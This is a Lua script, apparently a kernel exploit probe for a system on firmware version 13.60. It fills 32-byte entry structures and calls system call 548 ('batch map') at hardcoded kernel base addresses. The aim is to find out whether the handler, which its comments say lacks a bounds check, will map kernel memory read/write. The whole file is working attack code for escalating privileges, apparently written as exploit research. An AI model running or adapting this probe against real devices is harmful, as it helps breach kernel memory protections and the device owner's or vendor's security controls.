-- CRASH_CLASS: HIGH
-- PROBE 822a: sys 548 (batch map) entries aimed at kernel addresses
--
-- 13.60 body 0xabbe60: [uap+0x10] = entry array, [uap+0x18] = count,
-- [uap+8] = flags (mask 0xE0BFFB6F forbidden), each entry is 32 bytes
-- copied to a stack buffer, and the op dword lives at entry+0x1C (bounded to
-- 0..4).  Unlike sys 73 this handler has no map-bound check of its own, so
-- the question is whether the op implementations validate the range.
--
-- [A] validates the entry layout on a plain user VA (op 0 must produce a
-- mapping that 674 can see). [B]..[E] then aim the same entries at the 13.60
-- kernel base.  Every call is announced before it is made.

print("=== PROBE 822a: sys 548 at kernel addresses ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u(v)
    if type(v) == "table" then
        return uint64(to_num(v.h or 0)) * uint64(4294967296) + uint64(to_num(v.l or 0))
    end
    return uint64(v)
end
local function hx(v)
    if type(v) == "table" then
        return string.format("%08X%08X", to_num(v.h or 0), to_num(v.l or 0))
    end
    return string.format("%016X", v)
end
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return nil end
local function safe_wd(a, v) return (pcall(function() memory.write_dword(a, v) end)) end
local function safe_wq(a, v) return (pcall(function() memory.write_qword(a, v) end)) end

local sc548 = make_syscall(548)
local sc674 = make_syscall(674)

local mapbuf = memory.alloc(0x10000)
local cnt = memory.alloc(8)
local function regions()
    safe_wd(cnt, 0)
    local ok = pcall(function() sc674(u(mapbuf), u(72), u(512), u(cnt), u(0x40000000), u(0)) end)
    return ok and (safe_rd(cnt) or -1) or -1
end

-- one 32-byte entry buffer, reused
local ent = memory.alloc(0x40)
local function set_entry(start, len, prot, typ, flags, op)
    safe_wq(ent + 0x00, u(start))
    safe_wq(ent + 0x08, u(len))
    safe_wd(ent + 0x10, prot)
    safe_wd(ent + 0x14, typ)
    safe_wd(ent + 0x18, flags)
    safe_wd(ent + 0x1C, op)
end

local function call548(start, len, prot, typ, flags, op)
    set_entry(start, len, prot, typ, flags, op)
    local r = -99
    pcall(function() r = to_num(sc548(u(ent), u(0), u(1), u(0), u(0))) end)
    return r
end

print(string.format("[0] pid=%d regions=%d", to_num(make_syscall(20)(u(0),u(0),u(0),u(0),u(0),u(0))) , regions()))
print("")

local before = regions()
print(string.format("[A] before=%d  calling 548 op0 at 0x300000000 prot=3", before))
local r = call548(0x300000000, 0x4000, 3, 0, 0, 0)
print(string.format("[A] ret=%d  after=%d", r, regions()))
if r == 0 then
    print(string.format("[A] read/write at 0x300000000: rd=%s", safe_rd(0x300000000) and string.format("%08X", safe_rd(0x300000000)) or "FAULT"))
    print(string.format("[A] write ok=%s", tostring(safe_wd(0x300000000, 0x41424344))))
end
print("")

local tries = {
    { "op0 kbase prot3", 0xFFFFFFFF8A9C0000, 0x4000, 3, 0, 0, 0 },
    { "op0 kbase prot1", 0xFFFFFFFF8A9C0000, 0x4000, 1, 0, 0, 0 },
    { "op0 kbase len0",  0xFFFFFFFF8A9C0000, 0,     3, 0, 0, 0 },
    { "op0 ktop  prot3", 0xFFFFFFFF8C140000, 0x4000, 3, 0, 0, 0 },
}
for _, t in ipairs(tries) do
    print(string.format("[B] calling %-16s addr=%s", t[1], hx(t[2])))
    local rr = call548(t[2], t[3], t[4], t[5], t[6], t[7])
    print(string.format("[B] %-16s ret=%d regions=%d", t[1], rr, regions()))
end
print("")

for op = 1, 4 do
    print(string.format("[C] calling op%d at kbase", op))
    local rr = call548(0xFFFFFFFF8A9C0000, 0x4000, 3, 0, 0, op)
    print(string.format("[C] op%d ret=%d regions=%d", op, rr, regions()))
end
print("[D] survived")
